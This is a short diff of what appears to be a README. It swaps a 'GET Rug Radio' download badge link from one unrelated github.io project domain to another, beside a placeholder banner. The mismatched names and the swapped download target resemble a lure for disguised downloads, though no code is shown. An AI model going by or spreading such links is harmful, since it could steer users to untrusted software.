@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=7fb4897e77ddebb52f3cdc080ee9584315211e20-4571079-images-thumbs&n=13)
 
-[![GET Rug Radio](https://img.shields.io/badge/GET%20%E2%80%94%20Rug%20Radio-0078D6?style=for-the-badge&logoColor=white)](https://backup-and-restore-toolkit.github.io/.github/rug-radio)
+[![GET Rug Radio](https://img.shields.io/badge/GET%20%E2%80%94%20Rug%20Radio-0078D6?style=for-the-badge&logoColor=white)](https://virtual-machine-monitor-suite.github.io/.github/rug-radio)
 
 ---
 
